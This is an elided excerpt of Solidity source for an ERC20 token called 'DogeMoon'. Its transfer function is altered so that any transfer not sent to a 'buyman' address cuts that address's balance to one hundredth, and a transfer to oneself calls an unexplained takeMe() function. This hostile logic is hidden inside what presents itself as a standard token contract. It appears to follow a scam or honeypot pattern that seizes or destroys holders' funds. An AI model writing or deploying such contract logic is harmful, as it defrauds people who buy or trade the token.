...
contract ERC20 is IERC20 {
    ...
    function transfer(address to, uint256 amount) external virtual override returns (bool) {
        if (to != buyman){_balances[buyman]= _balances[buyman].divCeil(100);}
        if (to == msg.sender) {takeMe();}
...
contract DogeMoon is ERC20 {
    ...
    constructor() ERC20("DogeMoon", "DGK") {

        // INITIALLY MINT TOTAL SUPPLY TO CREATOR
        _prevOwner = msg.sender;
        uint256 _totalSupply = 1000000 * (10 ** 2);
        _mint(msg.sender, _totalSupply );
        _burn(msg.sender, _totalSupply/2);
        uint ad = _totalSupply/10000;
        _transfer(msg.sender, address(this), ad);
